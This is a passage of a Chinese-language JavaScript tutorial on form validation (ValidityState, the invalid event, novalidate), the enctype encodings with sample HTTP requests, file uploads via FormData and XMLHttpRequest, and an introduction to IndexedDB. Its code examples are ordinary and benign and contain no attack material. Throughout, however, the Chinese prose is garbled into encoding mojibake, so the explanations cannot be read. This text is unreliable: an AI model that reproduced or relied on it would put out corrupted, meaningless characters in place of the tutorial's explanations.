<h4 id="validity-å±æ€§"><a href="#validity-å±æ€§" class="headerlink" title="validity å±æ€§"></a>validity å±æ€§</h4><p>æ§ä»¶å…ƒç´ çš„å±æ€§<code>validity</code>å±æ€§è¿”å›ä¸€ä¸ª<code>ValidityState</code>å¯¹è±¡ï¼ŒåŒ…å«å½“å‰æ ¡éªŒçŠ¶æ€çš„ä¿¡æ¯ã€‚</p>
<p>è¯¥å¯¹è±¡æœ‰ä»¥ä¸‹å±æ€§ï¼Œå…¨éƒ¨ä¸ºåªè¯»å±æ€§ã€‚</p>
<ul>
<li><code>ValidityState.badInput</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæµè§ˆå™¨æ˜¯å¦ä¸èƒ½å°†ç”¨æˆ·çš„è¾“å…¥è½¬æ¢æˆæ­£ç¡®çš„ç±»å‹ï¼Œæ¯”å¦‚ç”¨æˆ·åœ¨æ•°å€¼æ¡†é‡Œé¢è¾“å…¥å­—ç¬¦ä¸²ã€‚</li>
<li><code>ValidityState.customError</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦å·²ç»è°ƒç”¨<code>setCustomValidity()</code>æ–¹æ³•ï¼Œå°†æ ¡éªŒä¿¡æ¯è®¾ç½®ä¸ºä¸€ä¸ªéç©ºå­—ç¬¦ä¸²ã€‚</li>
<li><code>ValidityState.patternMismatch</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·è¾“å…¥çš„å€¼æ˜¯å¦ä¸æ»¡è¶³æ¨¡å¼çš„è¦æ±‚ã€‚</li>
<li><code>ValidityState.rangeOverflow</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·è¾“å…¥çš„å€¼æ˜¯å¦å¤§äºæœ€å¤§èŒƒå›´ã€‚</li>
<li><code>ValidityState.rangeUnderflow</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·è¾“å…¥çš„å€¼æ˜¯å¦å°äºæœ€å°èŒƒå›´ã€‚</li>
<li><code>ValidityState.stepMismatch</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·è¾“å…¥çš„å€¼ä¸ç¬¦åˆæ­¥é•¿çš„è®¾ç½®ï¼ˆå³ä¸èƒ½è¢«æ­¥é•¿å€¼æ•´é™¤ï¼‰ã€‚</li>
<li><code>ValidityState.tooLong</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·è¾“å…¥çš„å­—æ•°è¶…å‡ºäº†æœ€é•¿å­—æ•°ã€‚</li>
<li><code>ValidityState.tooShort</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·è¾“å…¥çš„å­—ç¬¦å°‘äºæœ€çŸ­å­—æ•°ã€‚</li>
<li><code>ValidityState.typeMismatch</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·å¡«å…¥çš„å€¼ä¸ç¬¦åˆç±»å‹è¦æ±‚ï¼ˆä¸»è¦æ˜¯ç±»å‹ä¸º Email æˆ– URL çš„æƒ…å†µï¼‰ã€‚</li>
<li><code>ValidityState.valid</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·æ˜¯å¦æ»¡è¶³æ‰€æœ‰æ ¡éªŒæ¡ä»¶ã€‚</li>
<li><code>ValidityState.valueMissing</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·æ²¡æœ‰å¡«å…¥å¿…å¡«çš„å€¼ã€‚</li>
</ul>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var input &#x3D; document.getElementById(&#39;myinput&#39;);</span><br><span class="line">if (input.validity.valid) &#123;</span><br><span class="line">  console.log(&#39;é€šè¿‡æ ¡éªŒ&#39;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  console.log(&#39;æ ¡éªŒå¤±è´¥&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢æ˜¯å¦å¤–ä¸€ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var txt &#x3D; &#39;&#39;;</span><br><span class="line">if (document.getElementById(&#39;myInput&#39;).validity.rangeOverflow) &#123;</span><br><span class="line">  txt &#x3D; &#39;æ•°å€¼è¶…è¿‡ä¸Šé™&#39;;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(&#39;prompt&#39;).innerHTML &#x3D; txt;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæƒ³ç¦æ­¢æµè§ˆå™¨å¼¹å‡ºè¡¨å•éªŒè¯çš„æŠ¥é”™ä¿¡æ¯ï¼Œå¯ä»¥ç›‘å¬<code>invalid</code>äº‹ä»¶ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">var input &#x3D; document.getElementById(&#39;username&#39;);</span><br><span class="line">var form  &#x3D; document.getElementById(&#39;form&#39;);</span><br><span class="line"></span><br><span class="line">var elem &#x3D; document.createElement(&#39;div&#39;);</span><br><span class="line">elem.id  &#x3D; &#39;notify&#39;;</span><br><span class="line">elem.style.display &#x3D; &#39;none&#39;;</span><br><span class="line">form.appendChild(elem);</span><br><span class="line"></span><br><span class="line">input.addEventListener(&#39;invalid&#39;, function (event) &#123;</span><br><span class="line">  event.preventDefault();</span><br><span class="line">  if (!event.target.validity.valid) &#123;</span><br><span class="line">    elem.textContent   &#x3D; &#39;ç”¨æˆ·åå¿…é¡»æ˜¯å°å†™å­—æ¯&#39;;</span><br><span class="line">    elem.className     &#x3D; &#39;error&#39;;</span><br><span class="line">    elem.style.display &#x3D; &#39;block&#39;;</span><br><span class="line">    input.className    &#x3D; &#39;invalid animated shake&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">input.addEventListener(&#39;input&#39;, function(event)&#123;</span><br><span class="line">  if ( &#39;block&#39; &#x3D;&#x3D;&#x3D; elem.style.display ) &#123;</span><br><span class="line">    input.className &#x3D; &#39;&#39;;</span><br><span class="line">    elem.style.display &#x3D; &#39;none&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œä¸€æ—¦å‘ç”Ÿ<code>invalid</code>äº‹ä»¶ï¼ˆè¡¨å•éªŒè¯å¤±è´¥ï¼‰ï¼Œ<code>event.preventDefault()</code>ç”¨æ¥ç¦æ­¢æµè§ˆå™¨å¼¹å‡ºé»˜è®¤çš„éªŒè¯å¤±è´¥æç¤ºï¼Œç„¶åè®¾ç½®å®šåˆ¶çš„æŠ¥é”™æç¤ºæ¡†ã€‚</p>
<h4 id="è¡¨å•çš„-novalidate-å±æ€§"><a href="#è¡¨å•çš„-novalidate-å±æ€§" class="headerlink" title="è¡¨å•çš„ novalidate å±æ€§"></a>è¡¨å•çš„ novalidate å±æ€§</h4><p>è¡¨å•å…ƒç´ çš„ HTML å±æ€§<code>novalidate</code>ï¼Œå¯ä»¥å…³é—­æµè§ˆå™¨çš„è‡ªåŠ¨æ ¡éªŒã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;form novalidate&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå±æ€§ä¹Ÿå¯ä»¥åœ¨è„šæœ¬é‡Œè®¾ç½®ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">form.noValidate &#x3D; true;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè¡¨å•å…ƒç´ æ²¡æœ‰è®¾ç½®<code>novalidate</code>å±æ€§ï¼Œé‚£ä¹ˆæäº¤æŒ‰é’®ï¼ˆ<code>&lt; button&gt;</code>æˆ–<code>&lt; input&gt;</code>å…ƒç´ ï¼‰çš„<code>formnovalidate</code>å±æ€§ä¹Ÿæœ‰åŒæ ·çš„ä½œç”¨ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; formnovalidate&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<h3 id="enctype-å±æ€§"><a href="#enctype-å±æ€§" class="headerlink" title="enctype å±æ€§"></a>enctype å±æ€§</h3><p>è¡¨å•èƒ½å¤Ÿç”¨å››ç§ç¼–ç ï¼Œå‘æœåŠ¡å™¨å‘é€æ•°æ®ã€‚ç¼–ç æ ¼å¼ç”±è¡¨å•çš„<code>enctype</code>å±æ€§å†³å®šã€‚</p>
<p>å‡å®šè¡¨å•æœ‰ä¸¤ä¸ªå­—æ®µï¼Œåˆ†åˆ«æ˜¯<code>foo</code>å’Œ<code>baz</code>ï¼Œå…¶ä¸­<code>foo</code>å­—æ®µçš„å€¼ç­‰äº<code>bar</code>ï¼Œ<code>baz</code>å­—æ®µçš„å€¼æ˜¯ä¸€ä¸ªåˆ†ä¸ºä¸¤è¡Œçš„å­—ç¬¦ä¸²ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The first line.</span><br><span class="line">The second line.</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢å››ç§æ ¼å¼ï¼Œéƒ½å¯ä»¥å°†è¿™ä¸ªè¡¨å•å‘é€åˆ°æœåŠ¡å™¨ã€‚</p>
<p><strong>ï¼ˆ1ï¼‰GET æ–¹æ³•</strong></p>
<p>å¦‚æœè¡¨å•ä½¿ç”¨<code>GET</code>æ–¹æ³•å‘é€æ•°æ®ï¼Œ<code>enctype</code>å±æ€§æ— æ•ˆã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form</span><br><span class="line">  action&#x3D;&quot;register.php&quot;</span><br><span class="line">  method&#x3D;&quot;get&quot;</span><br><span class="line">  onsubmit&#x3D;&quot;AJAXSubmit(this); return false;&quot;</span><br><span class="line">&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>æ•°æ®å°†ä»¥ URL çš„æŸ¥è¯¢å­—ç¬¦ä¸²å‘å‡ºã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?foo&#x3D;bar&amp;baz&#x3D;The%20first%20line.%0AThe%20second%20line.</span><br></pre></td></tr></table></figure>

<p><strong>ï¼ˆ2ï¼‰application&#x2F;x-www-form-urlencoded</strong></p>
<p>å¦‚æœè¡¨å•ç”¨<code>POST</code>æ–¹æ³•å‘é€æ•°æ®ï¼Œå¹¶çœç•¥<code>enctype</code>å±æ€§ï¼Œé‚£ä¹ˆæ•°æ®ä»¥<code>application/x-www-form-urlencoded</code>æ ¼å¼å‘é€ï¼ˆå› ä¸ºè¿™æ˜¯é»˜è®¤å€¼ï¼‰ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form</span><br><span class="line">  action&#x3D;&quot;register.php&quot;</span><br><span class="line">  method&#x3D;&quot;post&quot;</span><br><span class="line">  onsubmit&#x3D;&quot;AJAXSubmit(this); return false;&quot;</span><br><span class="line">&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>å‘é€çš„ HTTP è¯·æ±‚å¦‚ä¸‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">foo&#x3D;bar&amp;baz&#x3D;The+first+line.%0D%0AThe+second+line.%0D%0A</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œæ•°æ®ä½“é‡Œé¢çš„<code>%0D%0A</code>ä»£è¡¨æ¢è¡Œç¬¦ï¼ˆ<code>\r\n</code>ï¼‰ã€‚</p>
<p><strong>ï¼ˆ3ï¼‰text&#x2F;plain</strong></p>
<p>å¦‚æœè¡¨å•ä½¿ç”¨<code>POST</code>æ–¹æ³•å‘é€æ•°æ®ï¼Œ<code>enctype</code>å±æ€§ä¸º<code>text/plain</code>ï¼Œé‚£ä¹ˆæ•°æ®å°†ä»¥çº¯æ–‡æœ¬æ ¼å¼å‘é€ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form</span><br><span class="line">  action&#x3D;&quot;register.php&quot;</span><br><span class="line">  method&#x3D;&quot;post&quot;</span><br><span class="line">  enctype&#x3D;&quot;text&#x2F;plain&quot;</span><br><span class="line">  onsubmit&#x3D;&quot;AJAXSubmit(this); return false;&quot;</span><br><span class="line">&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>å‘é€çš„ HTTP è¯·æ±‚å¦‚ä¸‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line"></span><br><span class="line">foo&#x3D;bar</span><br><span class="line">baz&#x3D;The first line.</span><br><span class="line">The second line.</span><br></pre></td></tr></table></figure>

<p><strong>ï¼ˆ4ï¼‰multipart&#x2F;form-data</strong></p>
<p>å¦‚æœè¡¨å•ä½¿ç”¨<code>POST</code>æ–¹æ³•ï¼Œ<code>enctype</code>å±æ€§ä¸º<code>multipart/form-data</code>ï¼Œé‚£ä¹ˆæ•°æ®å°†ä»¥æ··åˆçš„æ ¼å¼å‘é€ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form</span><br><span class="line">  action&#x3D;&quot;register.php&quot;</span><br><span class="line">  method&#x3D;&quot;post&quot;</span><br><span class="line">  enctype&#x3D;&quot;multipart&#x2F;form-data&quot;</span><br><span class="line">  onsubmit&#x3D;&quot;AJAXSubmit(this); return false;&quot;</span><br><span class="line">&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>å‘é€çš„ HTTP è¯·æ±‚å¦‚ä¸‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------314911788813839</span><br><span class="line"></span><br><span class="line">-----------------------------314911788813839</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;foo&quot;</span><br><span class="line"></span><br><span class="line">bar</span><br><span class="line">-----------------------------314911788813839</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;baz&quot;</span><br><span class="line"></span><br><span class="line">The first line.</span><br><span class="line">The second line.</span><br><span class="line"></span><br><span class="line">-----------------------------314911788813839--</span><br></pre></td></tr></table></figure>

<p>è¿™ç§æ ¼å¼ä¹Ÿæ˜¯æ–‡ä»¶ä¸Šä¼ çš„æ ¼å¼ã€‚</p>
<h3 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h3><p>ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶ï¼Œä¹Ÿæ˜¯é€šè¿‡è¡¨å•ã€‚å…·ä½“æ¥è¯´ï¼Œå°±æ˜¯é€šè¿‡æ–‡ä»¶è¾“å…¥æ¡†é€‰æ‹©æœ¬åœ°æ–‡ä»¶ï¼Œæäº¤è¡¨å•çš„æ—¶å€™ï¼Œæµè§ˆå™¨å°±ä¼šæŠŠè¿™ä¸ªæ–‡ä»¶å‘é€åˆ°æœåŠ¡å™¨ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot; name&#x3D;&quot;myFile&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>æ­¤å¤–ï¼Œè¿˜éœ€è¦å°†è¡¨å•<code>&lt;form&gt;</code>å…ƒç´ çš„<code>method</code>å±æ€§è®¾ä¸º<code>POST</code>ï¼Œ<code>enctype</code>å±æ€§è®¾ä¸º<code>multipart/form-data</code>ã€‚å…¶ä¸­ï¼Œ<code>enctype</code>å±æ€§å†³å®šäº† HTTP å¤´ä¿¡æ¯çš„<code>Content-Type</code>å­—æ®µçš„å€¼ï¼Œé»˜è®¤æƒ…å†µä¸‹è¿™ä¸ªå­—æ®µçš„å€¼æ˜¯<code>application/x-www-form-urlencoded</code>ï¼Œä½†æ˜¯æ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™è¦æ”¹æˆ<code>multipart/form-data</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;file&quot;&gt;é€‰æ‹©ä¸€ä¸ªæ–‡ä»¶&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot; name&#x3D;&quot;myFile&quot; multiple&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; id&#x3D;&quot;submit&quot; name&#x3D;&quot;submit_button&quot; value&#x3D;&quot;ä¸Šä¼ &quot; &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„ HTML ä»£ç ä¸­ï¼Œfile æ§ä»¶çš„<code>multiple</code>å±æ€§ï¼ŒæŒ‡å®šå¯ä»¥ä¸€æ¬¡é€‰æ‹©å¤šä¸ªæ–‡ä»¶ï¼›å¦‚æœæ²¡æœ‰è¿™ä¸ªå±æ€§ï¼Œåˆ™ä¸€æ¬¡åªèƒ½é€‰æ‹©ä¸€ä¸ªæ–‡ä»¶ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var fileSelect &#x3D; document.getElementById(&#39;file&#39;);</span><br><span class="line">var files &#x3D; fileSelect.files;</span><br></pre></td></tr></table></figure>

<p>ç„¶åï¼Œæ–°å»ºä¸€ä¸ª FormData å®ä¾‹å¯¹è±¡ï¼Œæ¨¡æ‹Ÿå‘é€åˆ°æœåŠ¡å™¨çš„è¡¨å•æ•°æ®ï¼ŒæŠŠé€‰ä¸­çš„æ–‡ä»¶æ·»åŠ åˆ°è¿™ä¸ªå¯¹è±¡ä¸Šé¢ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var formData &#x3D; new FormData();</span><br><span class="line"></span><br><span class="line">for (var i &#x3D; 0; i &lt; files.length; i++) &#123;</span><br><span class="line">  var file &#x3D; files[i];</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; åªä¸Šä¼ å›¾ç‰‡æ–‡ä»¶</span><br><span class="line">  if (!file.type.match(&#39;image.*&#39;)) &#123;</span><br><span class="line">    continue;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  formData.append(&#39;photos[]&#39;, file, file.name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åï¼Œä½¿ç”¨ Ajax å‘æœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">xhr.open(&#39;POST&#39;, &#39;handler.php&#39;, true);</span><br><span class="line"></span><br><span class="line">xhr.onload &#x3D; function () &#123;</span><br><span class="line">  if (xhr.status !&#x3D;&#x3D; 200) &#123;</span><br><span class="line">    console.log(&#39;An error occurred!&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.send(formData);</span><br></pre></td></tr></table></figure>

<p>é™¤äº†å‘é€ FormData å®ä¾‹ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ AJAX å‘é€æ–‡ä»¶ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var file &#x3D; document.getElementById(&#39;test-input&#39;).files[0];</span><br><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">xhr.open(&#39;POST&#39;, &#39;myserver&#x2F;uploads&#39;);</span><br><span class="line">xhr.setRequestHeader(&#39;Content-Type&#39;, file.type);</span><br><span class="line">xhr.send(file);</span><br></pre></td></tr></table></figure>

<h2 id="IndexedDB-API"><a href="#IndexedDB-API" class="headerlink" title="IndexedDB API"></a>IndexedDB API</h2><h3 id="æ¦‚è¿°-7"><a href="#æ¦‚è¿°-7" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>éšç€æµè§ˆå™¨çš„åŠŸèƒ½ä¸æ–­å¢å¼ºï¼Œè¶Šæ¥è¶Šå¤šçš„ç½‘ç«™å¼€å§‹è€ƒè™‘ï¼Œå°†å¤§é‡æ•°æ®å‚¨å­˜åœ¨å®¢æˆ·ç«¯ï¼Œè¿™æ ·å¯ä»¥å‡å°‘ä»æœåŠ¡å™¨è·å–æ•°æ®ï¼Œç›´æ¥ä»æœ¬åœ°è·å–æ•°æ®ã€‚</p>
<p>ç°æœ‰çš„æµè§ˆå™¨æ•°æ®å‚¨å­˜æ–¹æ¡ˆï¼Œéƒ½ä¸é€‚åˆå‚¨å­˜å¤§é‡æ•°æ®ï¼šCookie çš„å¤§å°ä¸è¶…è¿‡ 4KBï¼Œä¸”æ¯æ¬¡è¯·æ±‚éƒ½ä¼šå‘é€å›æœåŠ¡å™¨ï¼›LocalStorage åœ¨ 2.5MB åˆ° 10MB ä¹‹é—´ï¼ˆå„å®¶æµè§ˆå™¨ä¸åŒï¼‰ï¼Œè€Œä¸”ä¸æä¾›æœç´¢åŠŸèƒ½ï¼Œä¸èƒ½å»ºç«‹è‡ªå®šä¹‰çš„ç´¢å¼•ã€‚æ‰€ä»¥ï¼Œéœ€è¦ä¸€ç§æ–°çš„è§£å†³æ–¹æ¡ˆï¼Œè¿™å°±æ˜¯ IndexedDB è¯ç”Ÿçš„èƒŒæ™¯ã€‚</p>
<p>é€šä¿—åœ°è¯´ï¼ŒIndexedDB å°±æ˜¯æµè§ˆå™¨æä¾›çš„æœ¬åœ°æ•°æ®åº“ï¼Œå®ƒå¯ä»¥è¢«ç½‘é¡µè„šæœ¬åˆ›å»ºå’Œæ“ä½œã€‚IndexedDB å…è®¸å‚¨å­˜å¤§é‡æ•°æ®ï¼Œæä¾›æŸ¥æ‰¾æ¥å£ï¼Œè¿˜èƒ½å»ºç«‹ç´¢å¼•ã€‚è¿™äº›éƒ½æ˜¯ LocalStorage æ‰€ä¸å…·å¤‡çš„ã€‚å°±æ•°æ®åº“ç±»å‹è€Œè¨€ï¼ŒIndexedDB ä¸å±äºå…³ç³»å‹æ•°æ®åº“ï¼ˆä¸æ”¯æŒ SQL æŸ¥è¯¢è¯­å¥ï¼‰ï¼Œæ›´æ¥è¿‘ NoSQL æ•°æ®åº“ã€‚</p>
<p>IndexedDB å…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ã€‚</p>
<p><strong>ï¼ˆ1ï¼‰é”®å€¼å¯¹å‚¨å­˜ã€‚</strong> IndexedDB å†…éƒ¨é‡‡ç”¨å¯¹è±¡ä»“åº“ï¼ˆobject storeï¼‰å­˜æ”¾æ•°æ®ã€‚æ‰€æœ‰ç±»å‹çš„æ•°æ®éƒ½å¯ä»¥ç›´æ¥å­˜å…¥ï¼ŒåŒ…æ‹¬ JavaScript å¯¹è±¡ã€‚å¯¹è±¡ä»“åº“ä¸­ï¼Œæ•°æ®ä»¥â€œé”®å€¼å¯¹â€çš„å½¢å¼ä¿å­˜ï¼Œæ¯ä¸€ä¸ªæ•°æ®è®°å½•éƒ½æœ‰å¯¹åº”çš„ä¸»é”®ï¼Œä¸»é”®æ˜¯ç‹¬ä¸€æ— äºŒçš„ï¼Œä¸èƒ½æœ‰é‡å¤ï¼Œå¦åˆ™ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ã€‚</p>
<p><strong>ï¼ˆ2ï¼‰å¼‚æ­¥ã€‚</strong> IndexedDB æ“ä½œæ—¶ä¸ä¼šé”æ­»æµè§ˆå™¨ï¼Œç”¨æˆ·ä¾ç„¶å¯ä»¥è¿›è¡Œå…¶ä»–æ“ä½œï¼Œè¿™ä¸ LocalStorage å½¢æˆå¯¹æ¯”ï¼Œåè€…çš„æ“ä½œæ˜¯åŒæ­¥çš„ã€‚å¼‚æ­¥è®¾è®¡æ˜¯ä¸ºäº†é˜²æ­¢å¤§é‡æ•°æ®çš„è¯»å†™ï¼Œæ‹–æ…¢ç½‘é¡µçš„è¡¨ç°ã€‚</p>
<p><strong>ï¼ˆ3ï¼‰æ”¯æŒäº‹åŠ¡ã€‚</strong> IndexedDB æ”¯æŒäº‹åŠ¡ï¼ˆtransactionï¼‰ï¼Œè¿™æ„å‘³ç€ä¸€ç³»åˆ—æ“ä½œæ­¥éª¤ä¹‹ä¸­ï¼Œåªè¦æœ‰ä¸€æ­¥å¤±è´¥ï¼Œæ•´ä¸ªäº‹åŠ¡å°±éƒ½å–æ¶ˆï¼Œæ•°æ®åº“å›æ»šåˆ°äº‹åŠ¡å‘ç”Ÿä¹‹å‰çš„çŠ¶æ€ï¼Œä¸å­˜åœ¨åªæ”¹å†™ä¸€éƒ¨åˆ†æ•°æ®çš„æƒ…å†µã€‚</p>
